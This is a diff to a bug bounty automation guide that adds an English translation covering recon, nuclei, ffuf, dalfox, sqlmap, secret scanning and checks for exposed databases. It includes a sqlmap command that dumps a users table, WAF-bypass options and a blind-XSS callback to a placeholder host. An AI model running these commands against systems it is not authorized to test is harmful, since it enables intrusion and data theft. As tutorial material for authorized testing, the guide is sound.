@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 버그바운티 자동화 도구 완전 정복
 
 ## 자동화 파이프라인 개요
@@ -1705,4 +1711,364 @@ if __name__ == "__main__":
     with open("bug_report.md", "w") as f:
         f.write(report)
     print("[+] 보고서 생성: bug_report.md")
+```
+
+---
+
+<a name="english"></a>
+
+# Complete Mastery of Bug Bounty Automation Tools
+
+## Automation Pipeline Overview
+
+```
+Target Domain
+    │
+    ▼
+[Reconnaissance Automation]
+subfinder + amass + assetfinder
+    │
+    ▼
+[Alive Check]
+httpx + httprobe
+    │
+    ▼
+[Screenshots]
+gowitness + eyewitness
+    │
+    ▼
+[Vulnerability Scan]
+nuclei + nikto + dalfox
+    │
+    ▼
+[Manual Verification]
+Burp Suite + Browser
+    │
+    ▼
+[Report Generation]
+```
+
+---
+
+## 1. Reconnaissance Automation
+
+The comprehensive bug bounty reconnaissance pipeline script performs subdomain enumeration via crt.sh and subfinder, HTTP alive checks, port scanning with naabu, URL collection, Nuclei vulnerability scanning, and JS secret detection.
+
+Key features:
+- Subdomain enumeration: crt.sh + subfinder (optionally amass)
+- HTTP alive check with title/server/tech extraction
+- JS file secret scanning using regex patterns (API keys, tokens, AWS credentials)
+- Nuclei vulnerability scanning with configurable severity filters
+- Bug triage with false positive filtering and Markdown/JSON report generation
+
+---
+
+## 2. Nuclei Advanced Usage
+
+### Basic Usage
+
+```bash
+# Scan specific target
+nuclei -u https://target.com -t nuclei-templates/
+
+# Multiple targets
+nuclei -list targets.txt -t nuclei-templates/
+
+# Filter by severity
+nuclei -u https://target.com -severity critical,high
+
+# CVE scan
+nuclei -u https://target.com -tags cve
+
+# Include authentication
+nuclei -u https://target.com \
+       -H "Authorization: Bearer eyJ..." \
+       -H "Cookie: session=abc123"
+
+# JSON output
+nuclei -u https://target.com -j -o results.json
+```
+
+### Custom Nuclei Template
+
+```yaml
+# custom_idor.yaml - IDOR detection template
+id: custom-idor-detection
+
+info:
+  name: IDOR via User ID Parameter
+  author: bugbounty-hunter
+  severity: high
+  tags: idor,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user?id=1"
+      - "{{BaseURL}}/api/user?id=2"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "email"
+          - "username"
+```
+
+---
+
+## 3. ffuf Complete Guide
+
+### Directory/File Fuzzing
+
+```bash
+# Basic directory brute force
+ffuf -u https://target.com/FUZZ \
+     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+     -c -v
+
+# Extension fuzzing
+ffuf -u https://target.com/FUZZ \
+     -w wordlist.txt \
+     -e .php,.asp,.aspx,.jsp,.txt,.bak
+
+# Filtering (by size/code)
+ffuf -u https://target.com/FUZZ \
+     -w wordlist.txt \
+     -fc 404 \
+     -fs 1234
+
+# Rate limiting
+ffuf -u https://target.com/FUZZ \
+     -w wordlist.txt \
+     -rate 100 \
+     -t 50
+```
+
+### Parameter Fuzzing
+
+```bash
+# GET parameter discovery
+ffuf -u "https://target.com/page?FUZZ=test" \
+     -w params.txt \
+     -fs 1234
+
+# POST parameter fuzzing
+ffuf -u https://target.com/login \
+     -X POST \
+     -d "username=admin&FUZZ=test" \
+     -w params.txt
+```
+
+---
+
+## 4. dalfox - XSS Automation
+
+```bash
+# Basic scan
+dalfox url "https://target.com/search?q=test"
+
+# Pipe input
+echo "https://target.com/search?q=test" | dalfox pipe
+
+# Blind XSS (callback server)
+dalfox url "https://target.com/search?q=test" \
+           -b "https://your-callback.com/xss"
+
+# WAF evasion mode
+dalfox url "https://target.com/search?q=test" \
+           --waf-evasion
+
+# Pipeline integration
+cat all_urls.txt | grep "=" | dalfox pipe --silence
+```
+
+---
+
+## 5. SQLMap Advanced Usage
+
+```bash
+# Basic scan
+sqlmap -u "https://target.com/page?id=1" --batch
+
+# WAF bypass (tamper scripts)
+sqlmap -u "https://target.com/?id=1" \
+       --tamper=space2comment,between,randomcase \
+       --batch
+
+# DB dump (authorized environments)
+sqlmap -u "https://target.com/?id=1" \
+       --dbs -D webapp --tables -T users --dump --batch
+
+# Using Burp request file
+sqlmap -r request.txt --batch --level 5 --risk 3
+```
+
+---
+
+## 6. Secret Detection Automation
+
+### GitLeaks
+
+```bash
+# Scan local repository
+gitleaks detect --source=./repo --report-path=leaks.json
+
+# Scan GitHub remote repository
+gitleaks detect --source=https://github.com/user/repo
+
+# Scan commit history
+gitleaks detect --source=. --log-opts="HEAD~50..HEAD"
+```
+
+### TruffleHog
+
+```bash
+# GitHub scan
+trufflehog github --repo=https://github.com/user/repo
+
+# Filesystem scan
+trufflehog filesystem --path=./code
+
+# Include verification (only actually valid secrets)
+trufflehog github --repo=... --only-verified
+```
+
+---
+
+## 7. Bug Bounty Tool Installation Script
+
+```bash
+#!/bin/bash
+# setup_bugbounty.sh - Bulk install bug bounty tools
+
+echo "[*] Starting bug bounty tool installation..."
+
+# Reconnaissance tools
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/tomnomnom/assetfinder@latest
+
+# HTTP probe
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+
+# Port scan
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+
+# URL collection
+go install -v github.com/tomnomnom/waybackurls@latest
+go install -v github.com/lc/gau/v2/cmd/gau@latest
+
+# Vulnerability scanner
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+# XSS
+go install -v github.com/hahwul/dalfox/v2@latest
+
+# Secret detection
+go install -v github.com/gitleaks/gitleaks/v8@latest
+
+echo "[+] Installation complete!"
+```
+
+---
+
+## 8. Open Database Detection (Firebase / ElasticSearch / MongoDB)
+
+```bash
+# Firebase Realtime Database public access detection
+curl https://target-app.firebaseio.com/.json
+# If data is returned → publicly accessible without authentication
+
+# ElasticSearch without authentication
+curl http://target.com:9200/
+curl http://target.com:9200/_cat/indices
+
+# MongoDB exposed without authentication
+shodan search "port:27017 -authentication"
+
+# Nuclei database detection
+nuclei -u target.com -tags mongodb,database,exposure
+```
+
+---
+
+## 9. Bug Report Auto-Generation
+
+```python
+#!/usr/bin/env python3
+"""Bug report auto-generator"""
+from datetime import datetime
+
+def generate_report(
+    title: str,
+    severity: str,
+    cvss: float,
+    endpoint: str,
+    param: str,
+    payload: str,
+    response: str,
+    impact: str,
+    steps: list,
+    remediation: str
+) -> str:
+    
+    template = f"""# {title}
+
+## Vulnerability Information
+
+| Item | Details |
+|------|---------|
+| **Severity** | {severity} |
+| **CVSS Score** | {cvss} |
+| **Discovery Date** | {datetime.now().strftime('%Y-%m-%d')} |
+| **Status** | New |
+
+---
+
+## Summary
+
+A {title} vulnerability was found at the `{endpoint}` endpoint in the `{param}` parameter.
+An attacker could use this to {impact}
+
+---
+
+## Reproduction Steps
+
+{"".join(f"{i+1}. {step}{chr(10)}" for i, step in enumerate(steps))}
+
+### Request
+
+```
+{payload}
+```
+
+### Response
+
+```
+{response}
+```
+
+---
+
+## Impact
+
+{impact}
+
+---
+
+## Remediation
+
+{remediation}
+
+---
+
+## References
+
+- [OWASP](https://owasp.org)
+- [CWE](https://cwe.mitre.org)
+"""
+    return template
 ```
